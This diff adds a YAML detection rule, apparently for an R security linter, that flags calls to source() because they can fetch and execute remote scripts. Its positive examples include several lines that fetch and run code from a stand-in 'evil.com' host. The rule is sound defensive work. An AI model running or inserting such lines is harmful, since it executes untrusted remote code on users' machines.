@@ -1,0 +1,28 @@
+name: source_pattern
+version: "0.1.0"
+type: warning
+message: >-
+  source() can fetch and execute local and remote R scripts.
+attck:
+  - T1059
+  - T1195.002
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    text() = 'source'
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    source("http://evil.com/evil.R")
+  - |
+    source(url("http://evil.com/evil.R"))
+  - |
+    source(system.file("inst", "evil.R", package = pkgname))
+  - |
+    base::source("http://evil.com/evil.R")
+negative_examples:
+  - |
+    foo$source()
+  - |
+    foo@source()
